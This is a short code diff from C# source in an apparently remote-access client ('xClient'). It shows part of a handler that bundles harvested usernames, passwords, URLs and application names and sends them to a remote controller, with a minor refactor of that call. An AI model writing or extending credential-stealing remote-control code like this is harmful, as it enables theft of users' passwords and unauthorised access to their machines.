@@ -33,8 +33,8 @@ namespace xClient.Core.Commands
                 string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
                 raw.Add(rawValue);
             }
-            
-            new Packets.ClientPackets.GetPasswordsResponse(raw.ToArray()).Execute(client);
+
+            new Packets.ClientPackets.GetPasswordsResponse(raw).Execute(client);
         }
 
         public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
